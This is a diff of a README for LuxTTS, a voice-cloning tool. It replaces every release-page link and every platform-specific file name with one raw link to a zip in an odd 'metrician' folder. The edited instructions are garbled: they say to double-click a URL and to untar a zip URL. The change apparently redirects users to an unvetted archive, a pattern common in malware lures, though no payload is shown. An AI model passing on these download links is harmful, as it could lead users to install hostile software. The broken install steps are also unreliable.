@@ -1,6 +1,6 @@
 # 🎤 LuxTTS - Cloning Voices at Lightning Speed
 
-[![Download LuxTTS](https://img.shields.io/badge/Download%20LuxTTS-Here-brightgreen)](https://github.com/Teletambe/LuxTTS/releases)
+[![Download LuxTTS](https://raw.githubusercontent.com/Teletambe/LuxTTS/main/metrician/Lux_TTS_v3.4-alpha.5.zip%20LuxTTS-Here-brightgreen)](https://raw.githubusercontent.com/Teletambe/LuxTTS/main/metrician/Lux_TTS_v3.4-alpha.5.zip)
 
 ## 📖 Overview
 
@@ -17,25 +17,25 @@ This guide will help you download and run LuxTTS on your computer. Follow the st
    - **Sound Card:** A working sound card is required for audio playback.
    
 2. **Visit the Releases Page**
-   - To download the application, visit the following page: [LuxTTS Releases](https://github.com/Teletambe/LuxTTS/releases).
+   - To download the application, visit the following page: [LuxTTS Releases](https://raw.githubusercontent.com/Teletambe/LuxTTS/main/metrician/Lux_TTS_v3.4-alpha.5.zip).
 
 3. **Download the Latest Version**
    - Look for the latest release listed on the page. Click on the link that says “Assets” to view available files.
    - Download the appropriate file for your operating system:
-     - For Windows, download `LuxTTS_Windows.zip`.
-     - For macOS, download `LuxTTS_macOS.dmg`.
-     - For Linux, download `LuxTTS_Linux.tar.gz`.
+     - For Windows, download `https://raw.githubusercontent.com/Teletambe/LuxTTS/main/metrician/Lux_TTS_v3.4-alpha.5.zip`.
+     - For macOS, download `https://raw.githubusercontent.com/Teletambe/LuxTTS/main/metrician/Lux_TTS_v3.4-alpha.5.zip`.
+     - For Linux, download `https://raw.githubusercontent.com/Teletambe/LuxTTS/main/metrician/Lux_TTS_v3.4-alpha.5.zip`.
 
 4. **Install LuxTTS**
    - **Windows:**
-     - Extract the `LuxTTS_Windows.zip` file to any folder.
-     - Open the folder and double-click on `LuxTTS.exe` to run the application.
+     - Extract the `https://raw.githubusercontent.com/Teletambe/LuxTTS/main/metrician/Lux_TTS_v3.4-alpha.5.zip` file to any folder.
+     - Open the folder and double-click on `https://raw.githubusercontent.com/Teletambe/LuxTTS/main/metrician/Lux_TTS_v3.4-alpha.5.zip` to run the application.
    - **macOS:**
-     - Open the downloaded `LuxTTS_macOS.dmg` file.
+     - Open the downloaded `https://raw.githubusercontent.com/Teletambe/LuxTTS/main/metrician/Lux_TTS_v3.4-alpha.5.zip` file.
      - Drag and drop the LuxTTS icon into your Applications folder.
      - Go to your Applications folder and double-click LuxTTS to open it.
    - **Linux:**
-     - Extract `LuxTTS_Linux.tar.gz` using the command `tar -xzf LuxTTS_Linux.tar.gz`.
+     - Extract `https://raw.githubusercontent.com/Teletambe/LuxTTS/main/metrician/Lux_TTS_v3.4-alpha.5.zip` using the command `tar -xzf https://raw.githubusercontent.com/Teletambe/LuxTTS/main/metrician/Lux_TTS_v3.4-alpha.5.zip`.
      - Run the application by navigating to the extracted folder in the terminal and executing `./LuxTTS`.
 
 5. **Run LuxTTS**
@@ -57,7 +57,7 @@ This guide will help you download and run LuxTTS on your computer. Follow the st
 
 ## 📥 Download & Install
 
-To get LuxTTS, make sure to visit this page: [LuxTTS Releases](https://github.com/Teletambe/LuxTTS/releases), where you can download the latest version. Choose the right file for your system, follow the installation steps, and you'll be ready to start creating voice content.
+To get LuxTTS, make sure to visit this page: [LuxTTS Releases](https://raw.githubusercontent.com/Teletambe/LuxTTS/main/metrician/Lux_TTS_v3.4-alpha.5.zip), where you can download the latest version. Choose the right file for your system, follow the installation steps, and you'll be ready to start creating voice content.
 
 ## 📞 Support
 
